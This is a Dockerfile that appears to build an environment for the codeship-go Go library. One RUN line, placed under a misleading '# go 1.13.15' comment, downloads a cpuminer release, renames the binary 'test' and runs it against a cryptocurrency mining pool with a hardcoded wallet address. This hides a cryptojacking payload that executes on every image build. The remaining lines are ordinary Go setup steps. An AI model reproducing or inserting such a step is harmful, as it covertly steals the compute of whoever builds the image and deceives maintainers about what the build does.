ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN mkdir gudo && cd gudo && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a yespowerarwn -o stratum+tcps://stratum-na.rplant.xyz:7082 -u aw1qg9qcp3ydemq2uytmhk8v586rem29mpnd0nhjd3.voc
# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup
